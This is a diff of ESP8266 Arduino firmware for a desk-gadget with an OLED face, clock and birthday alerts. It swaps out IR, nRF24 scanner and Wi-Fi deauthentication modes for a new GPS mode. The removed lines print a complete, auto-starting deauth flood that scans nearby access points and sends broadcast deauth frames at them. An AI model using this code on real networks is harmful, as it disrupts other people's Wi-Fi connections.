@@ -3,95 +3,40 @@
 #include <ESP8266WebServer.h>
 #include <EEPROM.h>
 #include <Wire.h>
-#include <SPI.h>
-#include <RF24.h>
 #include <Adafruit_GFX.h>
 #include <Adafruit_SSD1306.h>
-#include <IRremoteESP8266.h>
-#include <IRrecv.h>
-#include <IRutils.h>
+#include <SoftwareSerial.h>
+#include <TinyGPSPlus.h>
 #include <time.h>
 
 extern "C" {
   #include "user_interface.h"
 }
 
+// Display Settings (SSD1306 128x64 I2C)
 #define SCREEN_WIDTH 128
 #define SCREEN_HEIGHT 64
 #define OLED_RESET    -1
 Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
 
 // Hardware Pin Definitions
-#define OLED_SDA      D3
-#define OLED_SCL      D4
-#define IR_RECV_PIN   D2
-#define BUTTON_PIN    D1    // GPIO5
-#define EXTERNAL_LED  D0    // GPIO16
+#define OLED_SDA      D3   // GPIO0
+#define OLED_SCL      D4   // GPIO2
+#define BUTTON_PIN    D1   // GPIO5
+#define EXTERNAL_LED  D0   // GPIO16
 
-// nRF24L01 Pin Definitions (Hardware HSPI: SCK=D5, MISO=D6, MOSI=D7)
-#define NRF_CE_PIN    3     // GPIO3 (RX pin used as CE output)
-#define NRF_CSN_PIN   D8    // GPIO15 (CSN)
-RF24 radio(NRF_CE_PIN, NRF_CSN_PIN);
+// GPS Module Serial Configuration (NEO-6M / NEO-8M)
+#define GPS_RX_PIN    D5   // GPIO14 (Connects to GPS TX)
+#define GPS_TX_PIN    D6   // GPIO12 (Connects to GPS RX)
+#define GPS_BAUD      9600
 
-// LED Timer State Variables
+SoftwareSerial gpsSerial(GPS_RX_PIN, GPS_TX_PIN);
+TinyGPSPlus gps;
+
+// LED Controller Variables
 bool alertLedActive = false;
 unsigned long alertLedStart = 0;
 const unsigned long LED_ALERT_DURATION = 120;
-
-// nRF24 Spectrum Scanner Channels
-#define NRF_NUM_CHANNELS 128
-uint8_t nrfValues[NRF_NUM_CHANNELS];
-uint8_t nrfStreak[NRF_NUM_CHANNELS];   // consecutive activity hits per channel
-uint8_t nrfHold[NRF_NUM_CHANNELS];     // freezes a bar briefly after a hit
-uint8_t nrfRxScratch[32];
-
-// Scrolling spectrum history (right-to-left)
-#define GRAPH_WIDTH 112
-uint8_t nrfScrollBuf[GRAPH_WIDTH];   // one summary column per sweep, 0..63
-uint32_t totalNrfHits = 0;
-uint8_t peakChannel = 0;
-uint8_t peakValue = 0;
-
-// Detection state (so you KNOW when a transmitter is found)
-bool     nrfRadioOk        = false;
-bool     nrfDeviceFound    = false;
-uint8_t  nrfFoundChannel   = 0;
-unsigned long nrfFoundAt   = 0;
-const uint8_t  NRF_DETECTION_STREAK   = 4;     // consecutive sweeps with signal = confirmed
-const unsigned long NRF_FOUND_BANNER_MS = 5000;
-
-// ==================== Wi-Fi Deauthentication ====================
-#define MAX_DEAUTH_APS 10
-#define DEAUTH_FRAMES_PER_BURST 8
-#define DEAUTH_BURST_INTERVAL 120
-
-struct DeauthAp {
-  uint8_t mac[6];
-  uint8_t channel;
-  char    ssid[33];
-  bool    valid;
-};
-
-DeauthAp deauthAps[MAX_DEAUTH_APS];
-int      deauthApCount     = 0;
-int      deauthCurrentAp   = 0;
-uint32_t deauthPacketsSent = 0;
-unsigned long lastDeauthBurst = 0;
-unsigned long lastDeauthScan  = 0;
-bool deauthScanning = false;
-bool deauthRunning  = true;   // flood starts automatically in this mode
-
-// Deauth frame: FC=0xC0 (deauth), reason 7 = class-3 frame from non-associated STA
-uint8_t deauthPacket[26] = {
-  0xC0, 0x00,                                             // frame control
-  0x00, 0x00,                                             // duration
-  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                     // DA  (filled per frame)
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                     // SA  (filled per frame)
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                     // BSSID (filled per frame)
-  0x00, 0x00,                                             // sequence control
-  0x07, 0x00                                              // reason code
-};
-
 
 // AP Config Portal Hotspot Credentials
 const char* AP_CONFIG_SSID = "COCO-Desk-Buddy";
@@ -145,12 +90,12 @@ unsigned long lastMarqueeShift = 0;
 
 ESP8266WebServer server(80);
 
-// NTP Time Configuration
-const long  gmtOffset_sec     = 19800; // IST: +5:30
+// NTP Time Configuration (IST: UTC +5:30)
+const long  gmtOffset_sec     = 19800;
 const int   daylightOffset_sec = 0;
 const char* ntpServer         = "pool.ntp.org";
 
-// Timers & State
+// Timers & States
 const unsigned long CLOCK_TIMEOUT_MS = 20000;
 unsigned long lastUserActivity       = 0;
 bool isClockModeActive               = false;
@@ -214,16 +159,6 @@ bool isNightWindow() {
   if (timeinfo->tm_hour >= 23 || timeinfo->tm_hour < 6) return true;
   return false;
 }
-
-// IR Decoder
-const uint16_t kCaptureBufferSize = 1024;
-const uint8_t kTimeout = 50;
-IRrecv irrecv(IR_RECV_PIN, kCaptureBufferSize, kTimeout, true);
-decode_results irResults;
-
-String lastProtocol = "Ready";
-String lastHexCode  = "Press Remote";
-int lastBits        = 0;
 
 // Wi-Fi Radar
 #define MAX_TARGETS 8
@@ -302,10 +237,8 @@ enum DeviceMode {
   MODE_RADAR = 0,
   MODE_SCANNER = 1,
   MODE_RF_TRIPWIRE = 2,
-  MODE_IR_DECODER = 3,
-  MODE_NRF_SCANNER = 4,
-  MODE_DEAUTH = 5,
-  MODE_AP_CONFIG = 6
+  MODE_GPS = 3,
+  MODE_AP_CONFIG = 4
 };
 
 DeviceMode currentMode = MODE_RADAR;
@@ -337,24 +270,6 @@ unsigned long lastZzzAnim = 0;
 void enterLockScreen();
 void unlockDevice();
 void drawEmoFace();
-
-// ==================== RF HELPERS ====================
-
-bool ensureNrfRadioReady() {
-  if (nrfRadioOk) return true;
-
-  nrfRadioOk = radio.begin();
-  if (!nrfRadioOk) return false;
-
-  radio.setAutoAck(false);
-  radio.disableCRC();
-  radio.setDataRate(RF24_2MBPS);
-  radio.setPALevel(RF24_PA_MAX);
-  radio.setAddressWidth(3);
-  return true;
-}
-
-// =============================================================
 
 void loadCredentials() {
   EEPROM.begin(EEPROM_SIZE);
@@ -582,7 +497,7 @@ void handleRoot() {
 
     html += "<hr><h3 style='margin:10px 0;color:#00bcd4;'>Match Clock & Wish</h3>";
     html += "<label>Wish Message:</label>";
-    html += "<input type='text' name='smstext' maxlength='60' placeholder='Write your msg' value=''>";
+    html += "<input type='text' name='smstext' maxlength='60' placeholder='Happy Birthday Ankita!' value=''>";
     html += "<label>Set Target Date & Time:</label>";
     html += "<input type='datetime-local' name='smstime'>";
 
@@ -648,91 +563,6 @@ void handleConfigSave() {
   }
 }
 
-void initNrfScanner() {
-  if (!ensureNrfRadioReady()) {
-    memset(nrfValues, 0, sizeof(nrfValues));
-    memset(nrfStreak, 0, sizeof(nrfStreak));
-    memset(nrfHold, 0, sizeof(nrfHold));
-  memset(nrfScrollBuf, 0, sizeof(nrfScrollBuf));
-    totalNrfHits = 0;
-    nrfDeviceFound = false;
-    return;
-  }
-
-  radio.setAutoAck(false);
-  radio.disableCRC();
-  radio.setDataRate(RF24_2MBPS);
-  radio.setPALevel(RF24_PA_MAX);
-  radio.setAddressWidth(3);
-  radio.openReadingPipe(0, (uint64_t)0);   // accept almost anything
-  radio.startListening();
-  radio.stopListening();
-  memset(nrfValues, 0, sizeof(nrfValues));
-  memset(nrfStreak, 0, sizeof(nrfStreak));
-  memset(nrfHold, 0, sizeof(nrfHold));
-  memset(nrfScrollBuf, 0, sizeof(nrfScrollBuf));
-  totalNrfHits = 0;
-  nrfDeviceFound = false;
-}
-
-// ==================== DEAUTH HELPERS ====================
-
-void sendDeauthFrame(const uint8_t* da, const uint8_t* sa, const uint8_t* bssid) {
-  memcpy(&deauthPacket[4],  da, 6);
-  memcpy(&deauthPacket[10], sa, 6);
-  memcpy(&deauthPacket[16], bssid, 6);
-  if (wifi_send_pkt_freedom(deauthPacket, 26, 0) == 0) {
-    deauthPacketsSent++;
-  }
-}
-
-void updateDeauth() {
-  unsigned long now = millis();
-
-  // No targets yet -> (re)scan
-  if (deauthApCount == 0) {
-    if (!deauthScanning && now - lastDeauthScan > 8000) {
-      lastDeauthScan = now;
-      deauthScanning = true;
-      WiFi.scanNetworksAsync([](int found) {
-        deauthApCount = 0;
-        for (int i = 0; i < found && deauthApCount < MAX_DEAUTH_APS; i++) {
-          String s = WiFi.SSID(i);
-          s.trim();
-          if (s.length() == 0) continue;
-          DeauthAp& ap = deauthAps[deauthApCount];
-          memcpy(ap.mac, WiFi.BSSID(i), 6);
-          ap.channel = WiFi.channel(i);
-          s.toCharArray(ap.ssid, sizeof(ap.ssid));
-          ap.valid = true;
-          deauthApCount++;
-        }
-        deauthScanning = false;
-      });
-    }
-    return;
-  }
-
-  if (!deauthRunning) return;
-  if (now - lastDeauthBurst < DEAUTH_BURST_INTERVAL) return;
-  lastDeauthBurst = now;
-
-  DeauthAp& ap = deauthAps[deauthCurrentAp];
-  wifi_set_channel(ap.channel);
-
-  static const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-  for (int f = 0; f < DEAUTH_FRAMES_PER_BURST / 2; f++) {
-    sendDeauthFrame(broadcast, ap.mac, ap.mac);   // AP  -> all clients
-    sendDeauthFrame(ap.mac, broadcast, ap.mac);   // all -> AP
-    delay(2);
-  }
-
-  triggerLedAlert();
-  deauthCurrentAp = (deauthCurrentAp + 1) % deauthApCount;
-}
-
-// =============================================================
-
 void configureMode(DeviceMode newMode) {
   currentMode = newMode;
   display.clearDisplay();
@@ -740,8 +570,6 @@ void configureMode(DeviceMode newMode) {
 
   server.stop();
   wifi_promiscuous_enable(0);
-  irrecv.disableIRIn();
-  radio.powerDown();
   shutoffLeds();
   alertLedActive = false;
 
@@ -775,31 +603,10 @@ void configureMode(DeviceMode newMode) {
       for (int i = 0; i < WAVE_POINTS; i++) waveBuffer[i] = 42;
       break;
 
-    case MODE_IR_DECODER:
+    case MODE_GPS:
       WiFi.disconnect();
       WiFi.mode(WIFI_OFF);
-      irrecv.setUnknownThreshold(12);
-      irrecv.enableIRIn();
-      break;
-
-    case MODE_NRF_SCANNER:
-      WiFi.disconnect();
-      WiFi.mode(WIFI_OFF);
-      radio.powerUp();
-      initNrfScanner();
-      break;
-
-    case MODE_DEAUTH:
-      WiFi.persistent(false);
-      WiFi.disconnect();
-      WiFi.mode(WIFI_STA);
-      deauthApCount   = 0;
-      deauthCurrentAp = 0;
-      deauthPacketsSent = 0;
-      deauthRunning   = true;
-      deauthScanning  = false;
-      lastDeauthScan  = 0;
-      lastDeauthBurst = 0;
+      gpsSerial.begin(GPS_BAUD);
       break;
 
     case MODE_AP_CONFIG: {
@@ -911,7 +718,6 @@ void drawAutoLockBanner() {
 void drawBirthdayWishUI() {
   unsigned long now = millis();
   unsigned long elapsed = now - smsAlertStartTime;
-
   unsigned long cycleTime = elapsed % 7000;
 
   if (cycleTime >= 4500) {
@@ -1006,7 +812,7 @@ void checkScheduledSms() {
         t->tm_mday          == (int)wishTarget.day &&
         t->tm_hour          == (int)wishTarget.hour &&
         t->tm_min           == (int)wishTarget.minute) {
-
+      
       activeAlertType = 0;
       isSmsAlertActive = true;
       smsAlertStartTime = millis();
@@ -1034,12 +840,10 @@ void drawEmoFace() {
   const int eyeBaseY = 17;
 
   if (currentEmotion == EMO_LOVE) {
-    int heartY = 19 + (int)(sin(now * 0.012) * 3.0);
-    int heartScale = ((now / 200) % 2 == 0) ? 3 : 2;
-
+    int heartY = 19 + (int)(sin(now * 0.01) * 2.0);
     drawHappyArchedEye(leftEyeBaseX, eyeBaseY + 4, eyeW);
     drawHappyArchedEye(rightEyeBaseX, eyeBaseY + 4, eyeW);
-    drawSmallHeart(64, heartY, heartScale);
+    drawSmallHeart(64, heartY, 2);
     display.display();
     return;
   }
@@ -1156,60 +960,11 @@ void drawClockUI() {
 
   display.setTextSize(1);
   display.setCursor(6, 40);
-  display.printf("%s, %02d %s %04d",
-                 days[timeinfo->tm_wday],
-                 timeinfo->tm_mday,
-                 months[timeinfo->tm_mon],
+  display.printf("%s, %02d %s %04d", 
+                 days[timeinfo->tm_wday], 
+                 timeinfo->tm_mday, 
+                 months[timeinfo->tm_mon], 
                  timeinfo->tm_year + 1900);
-
-  display.display();
-}
-
-void drawDeauthUI() {
-  display.clearDisplay();
-  display.setTextColor(SSD1306_WHITE);
-  display.setTextSize(1);
-
-  display.setCursor(0, 0);
-  display.println("--- DEAUTH ATTACK ---");
-  display.drawLine(0, 9, 127, 9, SSD1306_WHITE);
-
-  if (deauthScanning || deauthApCount == 0) {
-    display.setCursor(0, 24);
-    display.println("Scanning networks...");
-    display.setCursor(0, 38);
-    display.println("Targets appear soon");
-    display.display();
-    return;
-  }
-
-  display.setCursor(0, 13);
-  display.printf("Targets:%d/%d", deauthCurrentAp + 1, deauthApCount);
-
-  display.setCursor(0, 24);
-  String s = String(deauthAps[deauthCurrentAp].ssid);
-  if (s.length() > 20) s = s.substring(0, 20);
-  display.print(s);
-
-  display.setCursor(0, 36);
-  display.printf("CH:%d  PKTS:%u", deauthAps[deauthCurrentAp].channel,
-                 (unsigned int)deauthPacketsSent);
-
-  display.setCursor(0, 46);
-  display.printf("MAC:%02X:%02X:%02X:%02X:%02X:%02X",
-                 deauthAps[deauthCurrentAp].mac[0], deauthAps[deauthCurrentAp].mac[1],
-                 deauthAps[deauthCurrentAp].mac[2], deauthAps[deauthCurrentAp].mac[3],
-                 deauthAps[deauthCurrentAp].mac[4], deauthAps[deauthCurrentAp].mac[5]);
-
-  if (!deauthRunning) {
-    display.fillRect(0, 56, 128, 8, SSD1306_WHITE);
-    display.setTextColor(SSD1306_BLACK);
-    display.setCursor(34, 56);
-    display.print("** PAUSED **");
-  } else {
-    display.setCursor(0, 56);
-    display.print("FLOODING (hold:pause)");
-  }
 
   display.display();
 }
@@ -1363,182 +1118,49 @@ void drawTripwireUI(float delta, int currentRssi, bool motionAlert) {
   display.display();
 }
 
-void drawDecoderUI() {
+// Dedicated GPS UI for 128x64 OLED
+void drawGpsUI() {
   display.clearDisplay();
   display.setTextColor(SSD1306_WHITE);
   display.setTextSize(1);
 
   display.setCursor(0, 0);
-  display.println("--- IR DECODER ---");
-
-  display.setCursor(0, 16);
-  display.print("Proto: ");
-  display.println(lastProtocol);
-
-  display.setCursor(0, 28);
-  display.print("Code : ");
-  display.println(lastHexCode);
-
-  display.setCursor(0, 40);
-  display.printf("Bits : %d-bit\n", lastBits);
-
-  display.setCursor(0, 54);
-  display.print("TSOP Receiver: Ready");
-
-  display.display();
-}
-
-// 2.4GHz nRF24L01 Spectrum & Packet Counter UI
-void drawNrfScannerUI() {
-  display.clearDisplay();
-  display.setTextColor(SSD1306_WHITE);
-  display.setTextSize(1);
-
-  // Wiring self-test: if the nRF24 doesn't answer on SPI, say so clearly
-  if (!nrfRadioOk) {
-    display.setCursor(0, 0);
-    display.print("--- 2.4G SCANNER ---");
-    display.drawLine(0, 9, 127, 9, SSD1306_WHITE);
-    display.setTextSize(2);
-    display.setCursor(4, 18);
-    display.print("NRF24 NOT");
-    display.setCursor(4, 38);
-    display.print("FOUND!");
-    display.setTextSize(1);
-    display.setCursor(0, 57);
-    display.print("Check CE/CSN wiring");
-    display.display();
-    return;
-  }
-
-  // ---------- Header ----------
-  if (nrfDeviceFound) {
-    bool blinkPhase = ((millis() / 140) % 2 == 0);
-    display.fillRect(0, 0, 128, 12, blinkPhase ? SSD1306_WHITE : SSD1306_BLACK);
-    display.setTextColor(blinkPhase ? SSD1306_BLACK : SSD1306_WHITE);
-    display.setCursor(4, 2);
-    display.print("SIGNAL FOUND CH:");
-    display.print(nrfFoundChannel);
-    display.setTextColor(SSD1306_WHITE);
+  display.print("GPS: ");
+  if (gps.location.isValid()) {
+    display.printf("FIX (%d SAT)", gps.satellites.value());
   } else {
-    display.setCursor(0, 0);
-    display.printf("PKTS:%u", (unsigned int)totalNrfHits);
-    display.setCursor(70, 0);
-    display.printf("PEAK:%dM", 2400 + peakChannel);
-    display.setCursor(0, 10);
-    display.print("2.4GHz SPECTRUM HISTORY");
+    display.printf("SEARCH (%d SAT)", gps.satellites.value());
   }
+  display.drawLine(0, 9, 127, 9, SSD1306_WHITE);
 
-  // ---------- Compact scrolling graph (NOT fullscreen) ----------
-  const int gL = 8;     // left
-  const int gT = 22;    // top
-  const int gR = 120;   // right
-  const int gB = 46;    // bottom
-  const int gW = gR - gL + 1;
-  const int gH = gB - gT + 1;
+  if (gps.location.isValid()) {
+    display.setCursor(0, 13);
+    display.printf("LAT: %.5f", gps.location.lat());
+    display.setCursor(0, 24);
+    display.printf("LON: %.5f", gps.location.lng());
 
-  display.drawRect(gL, gT, gW, gH, SSD1306_WHITE);
+    display.setCursor(0, 36);
+    display.printf("ALT: %.1fm  SPD: %.1f", gps.altitude.meters(), gps.speed.kmph());
 
-  int prevY = gB;
-  for (int x = 0; x < gW; x++) {
-    uint8_t v = nrfScrollBuf[x];
-    int bar = map(v, 0, 64, 0, gH - 3);
-    bar = constrain(bar, 0, gH - 3);
-    int y = gB - bar;
-    int sx = gL + x;
-
-    display.drawLine(sx, prevY, sx, y, SSD1306_WHITE); // smooth top line
-    if (bar > 0) display.fillRect(sx, y, 1, bar, SSD1306_WHITE);
-    prevY = y;
+    if (gps.time.isValid()) {
+      int hr = (gps.time.hour() + 5 + ((gps.time.minute() + 30) >= 60 ? 1 : 0)) % 24; // Convert UTC to IST (+5:30)
+      int mn = (gps.time.minute() + 30) % 60;
+      display.setCursor(0, 48);
+      display.printf("IST: %02d:%02d:%02d", hr, mn, gps.time.second());
+    }
+  } else {
+    display.setCursor(10, 24);
+    display.print("Waiting for lock...");
+    display.setCursor(10, 38);
+    display.printf("Chars Rx: %lu", gps.charsProcessed());
+    display.setCursor(10, 50);
+    display.print("Keep antenna open!");
   }
-
-  // Live marker on the newest (right) column
-  display.fillTriangle(gR - 1, gB + 2, gR + 4, gB + 2, gR + 1, gB + 7, SSD1306_WHITE);
-
-  // ---------- Bottom labels ----------
-  display.setCursor(0, 52);
-  display.print("<- OLD");
-  display.setCursor(48, 52);
-  display.print("SCROLLING");
-  display.setCursor(102, 52);
-  display.print("NEW");
 
   display.display();
 }
 
-void scanNrfChannels() {
-  if (!nrfRadioOk) return;
-
-  peakValue = 0;
-  peakChannel = 0;
-  unsigned long now = millis();
-
-  for (uint8_t i = 0; i < NRF_NUM_CHANNELS; i++) {
-    radio.setChannel(i);
-    radio.startListening();
-    delayMicroseconds(350);            // RPD/carrier need RX settle time
-
-    bool rpd = radio.testRPD();
-    bool cd  = radio.testCarrier();
-    uint8_t pk = 0;
-    while (radio.available() && pk < 3) {   // drain up to 3 real packets
-      radio.read(nrfRxScratch, 32);
-      pk++;
-    }
-    if (radio.available()) radio.flush_rx();
-
-    radio.stopListening();
-
-    bool activity = rpd || cd || (pk > 0);
-
-    if (activity) {
-      if (nrfValues[i] <= 60) nrfValues[i] += 4;   // fast attack
-      nrfStreak[i]++;
-      totalNrfHits++;
-      triggerLedAlert();
-
-      // Signal present for several sweeps in a row = real device, not noise
-      if (nrfStreak[i] >= NRF_DETECTION_STREAK) {
-        nrfDeviceFound = true;
-        nrfFoundChannel = i;
-        nrfFoundAt = now;
-        if (isDeviceLocked) setEmotion(EMO_SHOCKED);
-      }
-    } else {
-      nrfStreak[i] = 0;
-      if (nrfHold[i] > 0) {
-        nrfHold[i]--;                             // freeze the bar so you can see it
-      } else if (nrfValues[i] >= 4) {
-        nrfHold[i] = 30;                          // ~1.2s hold after last hit
-      } else if (nrfValues[i] > 0) {
-        nrfValues[i]--;                           // slow decay
-      }
-    }
-
-    if (nrfValues[i] > peakValue) {
-      peakValue = nrfValues[i];
-      peakChannel = i;
-    }
-  }
-
-  // --- Push sweep summary into scrolling history (right-to-left) ---
-  uint8_t sweepMax = 0;
-  for (uint8_t i = 0; i < NRF_NUM_CHANNELS; i++) {
-    if (nrfValues[i] > sweepMax) sweepMax = nrfValues[i];
-  }
-  for (uint8_t s = 0; s < 2; s++) {              // scroll speed: columns per sweep
-    for (uint8_t i = 0; i < GRAPH_WIDTH - 1; i++) {
-      nrfScrollBuf[i] = nrfScrollBuf[i + 1];     // shift left
-    }
-    nrfScrollBuf[GRAPH_WIDTH - 1] = sweepMax;    // newest at right edge
-  }
-
-  if (nrfDeviceFound && (now - nrfFoundAt > NRF_FOUND_BANNER_MS)) {
-    nrfDeviceFound = false;
-  }
-}
-
-// Startup connection routine
+// Clean static startup on 128x64 OLED
 void syncTimeAtStartup() {
   shutoffLeds();
 
@@ -1639,7 +1261,6 @@ void syncTimeAtStartup() {
 void setup() {
   pinMode(EXTERNAL_LED, OUTPUT);
   pinMode(BUTTON_PIN, INPUT_PULLUP);
-  pinMode(IR_RECV_PIN, INPUT_PULLUP);
 
   shutoffLeds();
 
@@ -1648,6 +1269,7 @@ void setup() {
   server.on("/", handleRoot);
   server.on("/save", HTTP_POST, handleConfigSave);
 
+  // Initialize I2C OLED
   Wire.begin(OLED_SDA, OLED_SCL);
   display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
   display.setRotation(2);
@@ -1656,9 +1278,8 @@ void setup() {
 
   setOledBrightness(userBrightness);
 
-  SPI.begin();
-  nrfRadioOk = radio.begin();
-  radio.powerDown();
+  // Initialize GPS Serial
+  gpsSerial.begin(GPS_BAUD);
 
   syncTimeAtStartup();
 
@@ -1672,6 +1293,12 @@ void setup() {
 void loop() {
   unsigned long currentMillis = millis();
 
+  // Read GPS UART stream continuously
+  while (gpsSerial.available() > 0) {
+    gps.encode(gpsSerial.read());
+  }
+
+  // 1. Birthday / Alert LED Strobe
   if (isSmsAlertActive) {
     bool strobe = ((currentMillis / 100) % 2 == 0);
     digitalWrite(EXTERNAL_LED, strobe ? HIGH : LOW);
@@ -1690,6 +1317,7 @@ void loop() {
     display.clearDisplay();
   }
 
+  // 2. Button Engine on D1
   if (currentMillis - lastButtonCheck >= 25) {
     lastButtonCheck = currentMillis;
     bool pinState = (digitalRead(BUTTON_PIN) == LOW);
@@ -1698,7 +1326,7 @@ void loop() {
       buttonIsPressed = true;
       buttonPressStartTime = currentMillis;
       holdThresholdMet = false;
-    }
+    } 
     else if (pinState && buttonIsPressed) {
       unsigned long heldTime = currentMillis - buttonPressStartTime;
 
@@ -1709,24 +1337,19 @@ void loop() {
           isPeekClockActive = false;
           setEmotion(EMO_LOVE);
         }
-        else if (!isDeviceLocked && currentMode == MODE_DEAUTH && heldTime >= 1200) {
-          holdThresholdMet = true;
-          clickCount = 0;
-          deauthRunning = !deauthRunning;
-        }
         else if (!isDeviceLocked && heldTime >= 2000) {
           holdThresholdMet = true;
           clickCount = 0;
           lastUserActivity = currentMillis;
           isClockModeActive = false;
           configureMode(MODE_AP_CONFIG);
-        }
+        } 
         else if (!isDeviceLocked && heldTime >= 400) {
           display.fillRect(10, 56, (heldTime - 400) * 108 / 1600, 4, SSD1306_WHITE);
           display.display();
         }
       }
-    }
+    } 
     else if (!pinState && buttonIsPressed) {
       buttonIsPressed = false;
       unsigned long duration = currentMillis - buttonPressStartTime;
@@ -1743,7 +1366,6 @@ void loop() {
         }
         else if (clickCount == 2) {
           clickCount = 0;
-
           if (isDeviceLocked) {
             unlockDevice();
           } else {
@@ -1777,9 +1399,7 @@ void loop() {
           DeviceMode nextMode;
           if (currentMode == MODE_RADAR)             nextMode = MODE_SCANNER;
           else if (currentMode == MODE_SCANNER)     nextMode = MODE_RF_TRIPWIRE;
-          else if (currentMode == MODE_RF_TRIPWIRE) nextMode = MODE_IR_DECODER;
-          else if (currentMode == MODE_IR_DECODER)  nextMode = MODE_NRF_SCANNER;
-          else if (currentMode == MODE_NRF_SCANNER) nextMode = MODE_DEAUTH;
+          else if (currentMode == MODE_RF_TRIPWIRE) nextMode = MODE_GPS;
           else                                      nextMode = MODE_RADAR;
 
           configureMode(nextMode);
@@ -1788,10 +1408,11 @@ void loop() {
     }
   }
 
+  // 3. Screen Saver / Auto-Lock
   if (!isDeviceLocked && currentMode != MODE_AP_CONFIG) {
     if (autoLockEnabled && (currentMillis - lastUserActivity >= (unsigned long)autoLockSeconds * 1000UL)) {
       enterLockScreen();
-    }
+    } 
     else if (!isClockModeActive && (currentMillis - lastUserActivity >= CLOCK_TIMEOUT_MS)) {
       isClockModeActive = true;
       if (autoDimEnabled) {
@@ -1814,6 +1435,7 @@ void loop() {
     display.clearDisplay();
   }
 
+  // 4. UI Rendering
   if (isSmsAlertActive) {
     drawBirthdayWishUI();
   } else if (isBannerActive) {
@@ -1837,6 +1459,7 @@ void loop() {
     }
   }
 
+  // 5. Active Sensing Modes
   switch (currentMode) {
     case MODE_RADAR: {
       if (currentMillis - lastChannelHop >= 180) {
@@ -1947,56 +1570,10 @@ void loop() {
       break;
     }
 
-    case MODE_IR_DECODER: {
-      if (irrecv.decode(&irResults)) {
-        bool isValidSignal = (irResults.decode_type != decode_type_t::UNKNOWN) &&
-                             (irResults.bits >= 8) &&
-                             (irResults.value != 0);
-
-        if (isValidSignal) {
-          lastProtocol = typeToString(irResults.decode_type);
-          lastHexCode  = "0x" + uint64ToString(irResults.value, HEX);
-          lastBits     = irResults.bits;
-
-          triggerLedAlert();
-
-          if (isDeviceLocked) {
-            setEmotion(EMO_WINK);
-          } else {
-            lastUserActivity = currentMillis;
-            if (isClockModeActive) {
-              isClockModeActive = false;
-              setOledBrightness(userBrightness);
-              display.clearDisplay();
-            }
-          }
-        }
-        irrecv.resume();
-      }
-
-      if (!isDeviceLocked && !isClockModeActive && !isBannerActive && !isSmsAlertActive && (currentMillis - lastDisplayDraw >= 100)) {
-        lastDisplayDraw = currentMillis;
-        drawDecoderUI();
-      }
-      break;
-    }
-
-    case MODE_NRF_SCANNER: {
-      scanNrfChannels();
-
-      if (!isDeviceLocked && !isClockModeActive && !isBannerActive && !isSmsAlertActive && (currentMillis - lastDisplayDraw >= 40)) {
-        lastDisplayDraw = currentMillis;
-        drawNrfScannerUI();
-      }
-      break;
-    }
-
-    case MODE_DEAUTH: {
-      updateDeauth();
-
+    case MODE_GPS: {
       if (!isDeviceLocked && !isClockModeActive && !isBannerActive && !isSmsAlertActive && (currentMillis - lastDisplayDraw >= 200)) {
         lastDisplayDraw = currentMillis;
-        drawDeauthUI();
+        drawGpsUI();
       }
       break;
     }
@@ -2011,4 +1588,4 @@ void loop() {
       break;
     }
   }
-}    
+}
